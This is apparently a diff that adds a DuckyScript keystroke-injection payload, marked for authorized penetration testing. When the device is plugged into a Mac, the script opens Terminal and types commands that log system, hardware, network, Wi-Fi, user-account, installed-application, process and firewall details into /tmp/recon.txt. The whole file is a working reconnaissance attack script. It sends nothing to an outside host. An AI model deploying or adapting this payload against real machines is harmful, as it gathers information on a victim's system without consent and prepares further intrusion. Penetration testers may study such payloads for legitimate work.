@@ -1,0 +1,107 @@
+REM Title: macOS System Enumeration
+REM Author: David Osisek (CamoZeroDay)
+REM Target: macOS 11+
+REM Version: 1.0
+REM Category: Reconnaissance
+REM
+REM ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+REM macOS system information gathering
+
+DELAY 1000
+
+REM Open Terminal
+COMMAND SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Output file
+STRING echo '=== MACOS SYSTEM ENUMERATION ===' > /tmp/recon.txt
+ENTER
+STRING echo "Date: $(date)" >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM System Info
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== SYSTEM INFO ===' >> /tmp/recon.txt
+ENTER
+STRING system_profiler SPSoftwareDataType >> /tmp/recon.txt
+ENTER
+DELAY 2000
+
+REM Hardware
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== HARDWARE ===' >> /tmp/recon.txt
+ENTER
+STRING system_profiler SPHardwareDataType >> /tmp/recon.txt
+ENTER
+DELAY 2000
+
+REM Network
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== NETWORK ===' >> /tmp/recon.txt
+ENTER
+STRING ifconfig >> /tmp/recon.txt
+ENTER
+STRING networksetup -listallnetworkservices >> /tmp/recon.txt
+ENTER
+DELAY 1000
+
+REM WiFi Info
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== WIFI ===' >> /tmp/recon.txt
+ENTER
+STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM Users
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== USERS ===' >> /tmp/recon.txt
+ENTER
+STRING dscl . list /Users >> /tmp/recon.txt
+ENTER
+STRING whoami >> /tmp/recon.txt
+ENTER
+STRING id >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM Applications
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== APPLICATIONS ===' >> /tmp/recon.txt
+ENTER
+STRING ls -la /Applications >> /tmp/recon.txt
+ENTER
+DELAY 1000
+
+REM Running Processes
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== PROCESSES ===' >> /tmp/recon.txt
+ENTER
+STRING ps aux >> /tmp/recon.txt
+ENTER
+DELAY 1000
+
+REM Firewall Status
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== FIREWALL ===' >> /tmp/recon.txt
+ENTER
+STRING sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate >> /tmp/recon.txt
+ENTER
+DELAY 1000
+
+REM Exit
+STRING exit
+ENTER
